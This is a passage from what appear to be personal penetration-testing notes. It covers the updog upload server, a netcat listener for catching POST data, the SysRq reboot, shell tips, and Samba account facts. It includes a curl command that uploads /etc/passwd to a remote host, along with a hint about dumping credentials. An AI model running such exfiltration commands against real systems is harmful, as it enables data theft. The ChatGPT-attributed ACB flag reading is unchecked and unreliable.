uploads).</p><p></p><p><h3>Setup</h3></p><p>Install it &amp; then place binary in your PATH (e.g by creating a symbolic link).</p><p></p><p><em>pip3 install updog</em><em></em></p><p><em>sudo ln -s /home/asura/.local/bin/updog /usr/local/bin/updog</em></p><p></p><p><h3>Start Server</h3></p><p>Automatically <span style="color:#ff0000;">listens on all interfaces</span> (even if it doesn&#39;t show that in the output).</p><p></p><p><em>updog -p 80</em></p><p></p><p><h3>Upload File</h3></p><p>Can use GUI, or should be able to upload via CLi as follows. For example, if server is run out of<strong> /dev/shm</strong>-</p><p></p><p><em>curl -v -XPOST -F &quot;file=@/etc/passwd;filename=passwd&quot; -F &quot;path=/dev/shm&quot; http://IP/upload</em></p><p></p><p>Can omit <strong>-XPOST</strong> as POST will be used by def when sending form data with <strong>-F</strong>.</p><p></p><p><h2>Accept POST Requests</h2></p><p>Basic Python webserver isn&#39;t configured for POST Requests. Can either use a <a href="file:///home/asura/code/python/python_server.py">Python script</a>, or run a PHP webserver.</p><p></p><p><h3>Read Body from POST Requests</h3></p><p><span style="text-decoration:line-through;">Use this GO </span><a href="file:///home/asura/code/go/http_server.go">webserver</a><span style="text-decoration:line-through;"> from the following </span><a href="https://www.informit.com/articles/article.aspx?p=2861456&seqNum=7">website</a><span style="text-decoration:line-through;">. You can start it like- </span><em><span style="text-decoration:line-through;">go run http_server.go</span></em></p><p></p><p>The most reliable method I&#39;ve found is to start a “dumb” <span style="color:#ff0000;">netcat listener</span>, since it&#39;ll <span style="color:#ff0000;">output any data</span> it receives without trying to process it!</p><p></p><p><em>nc -lvnp 80</em></p><p></p><p><span style="color:#060f94;text-decoration:underline;">Tip</span>: Even if client doesn&#39;t have R/ perms for a file, they should still connect to the listener (there just won&#39;t be any body data).</p><p></p><p><span class="subheading">Sending &gt;1 Request</span>: Since nc is “dumb” client won&#39;t auto disconnect. Need to <strong>CTRL + C</strong> &amp; <span style="color:#ff0000;">restart listener for EACH POST REQUEST</span>.</p><p></p><p><h1>Magic SysRq</h1></p><p>All hail the arcane wisdom of the ancient SysAdmins &amp; their magic solution to (almost) any problem.</p><p></p><p>Some / All of these key combos may be disabled by default depending on the distro.</p><p></p><p><h2>REISUB</h2></p><p>Reboot Even If System Utterly Broken. Works on Kali by default.</p><p></p><p><span style="color:#ff0000;">Even if you get some error messages</span> after some of these keys, <span style="color:#ff0000;">keep going</span>! It may still work anyways!</p><p></p><p>While holding down <strong>Ctrl</strong> + <strong>Alt</strong> + <strong>SysRq</strong> (Typicall the <strong>Print Scrn</strong> key), press the following keys, 1 at a time.</p><p></p><p><strong>R</strong> →<strong> E </strong>→<strong> I </strong>→ <strong>S </strong>→<strong> U </strong>→<strong> B</strong></p><p></p><p><h1>Tips &amp; Tricks</h1></p><p><h2>View Colored File</h2></p><p><strong>less -R</strong> shows the file in color. Otherwise the ANSI escape sequences won&#39;t be intepretted &amp; will appear as text.</p><p></p><p><h2>Output to File &amp; STDOUT</h2></p><p>Using <strong>| tee</strong> will print the output in real time &amp; write it to an output file.</p><p></p><p><h2>Interact with Local Users</h2></p><p><strong>who</strong> shows other <span style="color:#ff0000;">currently logged in users</span> (may be helpful for dumping creds from RAM?).</p><p></p><p>You can message these users with <strong>write</strong>.</p><p></p><p><h1>Fun Facts</h1></p><p><h2>nobody User Account</h2></p><p>The nobody user account that appears in <strong>/etc/passwd</strong> on Unix-like systems (including Linux and Samba servers) is a special or system account typically used for <span style="color:#ff0000;">anonymous or unauthenticated access</span>.</p><p></p><p>The exact role of the nobody account can vary based on the system and services running, but in general, it has the following characteristics:</p><p></p><p><h3>Characteristics</h3></p><p><span class="subheading">Low-Privilege Account</span>: The nobody user is usually assigned minimal permissions and typically doesn&#39;t have access to any user data or system resources beyond what&#39;s explicitly granted.</p><p></p><p>It is commonly used by services that need to run with the lowest privileges, such as services that handle anonymous access, or when a process needs to drop privileges after performing certain tasks (such as network services like HTTP, FTP, or Samba).</p><p></p><p><span class="subheading">Used for Anonymous or Unauthenticated Access</span>: In many cases, the nobody user is used to represent unauthenticated users or users with very limited access. For example:</p><p></p><p>Samba might use nobody for clients that access shares with no credentials or when using &quot;guest&quot; access.</p><p></p><p>NFS (Network File System) and other services might use nobody to map requests from unauthenticated or anonymous clients to a user with no real privileges.</p><p></p><p><span class="subheading">UID and GID</span>: In the /etc/passwd file, the nobody user typically has a low or non-standard user ID (UID), often 65534 (or 99 on some systems).</p><p></p><p>Similarly, the group ID (GID) for the nobody user is often also set to 65534 (or 99), making it a groupless or restricted group user in many cases.</p><p></p><p><h2>Samba Access Control Block (ACB)</h2></p><p>For Samba Servers, the ACB is a data structure used to store access control information for SMB protocol operations, specifically to track permissions and the security attributes associated with files, directories, and other resources.</p><p></p><p>The ACB is particularly important in handling file and share permissions within a Samba server. It helps to manage and enforce who can access which resources and what actions they are allowed to perform (read, write, execute, etc.).</p><p></p><p>This structure is often used in relation to access control lists (ACLs), which are used for fine-grained control over user and group permissions.</p><p></p><p><h3>Reading the ACB</h3></p><p>Tools like <strong>enum4linux-ng</strong> will output a user&#39;s ACB as a Hex value (bitmask). The specifics of what it means may vary based off of the Samba version or other factors. See the <a href="https://www.samba.org/~ab/output/htmldocs/Samba3-HOWTO/passdb.html">documentation</a> under “<strong>Account Flags Management</strong>” for further details.</p><p></p><p>In Samba 4.x (including 4.7.6), each ACB flag is represented by a bit in a bitmask, and the individual bits represent different states or permissions.</p><p></p><p>For example, ChatGPT provided the following analysis for an account which had <strong>acb: 0x00000010</strong>:</p><p></p><p>0x00000010 is bit 4 (counting from zero).</p><p></p><p>This corresponds to the ACB_NORMAL flag, which typically indicates that the user is a normal user and not a special account like a guest or system account.</p><p></p><p>In particular, this value is likely associated with a &quot;normal account&quot; status, indicating that the user has no restrictions on access (i.e., they are a regular user account as opposed to a guest, anonymous, or system account).</p></div>
</body>
</html>
